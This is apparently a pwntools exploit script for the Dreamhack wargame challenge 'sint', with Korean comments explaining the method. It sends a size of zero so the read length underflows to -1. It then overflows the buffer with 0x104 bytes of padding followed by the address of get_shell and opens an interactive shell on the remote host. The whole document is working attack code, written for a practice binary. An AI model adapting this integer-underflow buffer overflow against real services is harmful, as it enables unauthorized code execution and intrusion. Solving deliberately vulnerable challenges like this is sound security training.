from pwn import *

p = remote('host3.dreamhack.games', 23170)
e = ELF('./sint')

# Canary(X) NX(O) PIE(X)

# get_shell 함수를 실행하는 것이 목표~
get_shell = e.symbols['get_shell']

p.sendlineafter(b'Size: ', str(0))
# size=0이면 if문에는 안 걸리고 read의 크기로 -1이 들어가니까 bof로 엄청 큰 크기를 read하게 된다.
buf = b'A' * 0x104
buf += p32(get_shell)

p.sendafter(b'Data: ', buf)

p.interactive()